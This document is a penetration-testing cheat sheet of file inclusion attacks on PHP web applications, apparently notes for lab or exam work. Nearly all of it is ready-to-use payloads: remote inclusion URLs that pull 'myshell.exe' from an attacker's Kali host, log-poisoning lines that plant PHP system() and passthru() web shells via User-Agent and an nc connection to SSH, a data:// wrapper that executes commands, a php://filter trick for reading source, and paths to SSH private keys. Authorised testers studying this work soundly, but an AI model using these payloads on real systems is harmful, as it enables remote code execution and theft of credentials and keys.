#### Identifying
```
c:\Windows\System32\Drivers\etc\hosts
/etc/passwd
```

#### Validating
```

```
#### Exploiting
##### RFI
```
#Check whether you can request a file from a remote server.
1. http://example.com/file.php?file=http://<kali-ip>/myshell.exe
2. Windows: http://example.com/file.php?file=//<kali-ip>/kali/myshell.exe --> If doesn't execute can you capture the hash?
```
##### LFI
```
#Check whether we can execute local files. Is there a way to upload prior perhaps?
1. http://example.com/file.php?file=/../../../var/www/html/myshell.exe

#Check whether we can poison log files.
	#Check can you read / access the log file? This a good first indication that might be the attack path.
	#Apache
	1. Windows: http://example.com/file.php?file=/../../../xampp/apache2/logs/access.log | /../../../xampp/apache/logs/access.log
	2. Linux: http://example.com/file.php?file=/../../../var/log/apache2/access.log | /../../../var/log/apache/access.log
	#Poison log
	1. Payload: User-Agent: <?php echo system($_GET['cmd']); ?>

	#SSH
	#Check is it logging SSH connections?
	1. http://example.com/file.php?file=/../../../var/log/auth.log
	#Poison log
	1. nc -nv <ip> 22
	2. Payload: Thisislogpoisoning/<?php passthru($_GET['cmd']); ?>

	#Other Log poisoning
	1. Proc Self Environ: https://www.exploit-db.com/papers/12886
	2. FreeBSD: /var/log/httpd-access.log | /var/log/httpd-error.log

#PHP Wrappers
	#Data Wrapper - Code Execution!
	1. http://example.com/file.php?file=data://text/plain,<%3fphp%2520echo%2520system('uname+-a')%3b%3f>
	
	#Filter Wrapper - Read PHP Files!
	1. http://example.com/file.php?file=php://filter/convert.base64-encode/resource=../../../../var/www/html/backup.php
	
```
##### PT
```
#What can we read that would be useful?
#SSH KEYS!
	#Home (Check /etc/passwd first for usernames.)
	1. /home/<user>/ + .ssh/id_rsa | .ssh/id_rsa.keystore | .ssh/id_rsa.pub | .ssh/authorized_keys | .ssh/known_hosts | .ssh/config
	#Configuration
	2. /etc/ssh/ssh_config


```
